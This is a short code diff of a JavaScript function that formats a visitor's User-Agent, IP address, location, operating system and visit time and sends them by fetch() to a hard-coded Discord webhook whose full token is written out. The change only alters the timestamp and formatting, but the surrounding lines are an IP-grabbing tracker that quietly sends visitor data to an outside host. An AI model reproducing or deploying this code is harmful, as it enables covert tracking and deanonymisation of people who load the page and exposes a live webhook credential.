@@ -59,7 +59,7 @@ function check() {
 function loadingapi(UA, addr, c, r, co) {
   const csc = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
   const F = {
-    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${c}, ${r}, ${co}\` \n **OS:** \`${os}\`\n**Hit time**: <t:${currentTime}:T> raw: \`${currentTime}\``
+    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${c}, ${r}, ${co}\` \n **OS:** \`${os}\` \n**Hit time**: <t:${getCurrentUnixTime}:T> raw: \`${getCurrentUnixTime}\` `
   };
 
   fetch(csc, {
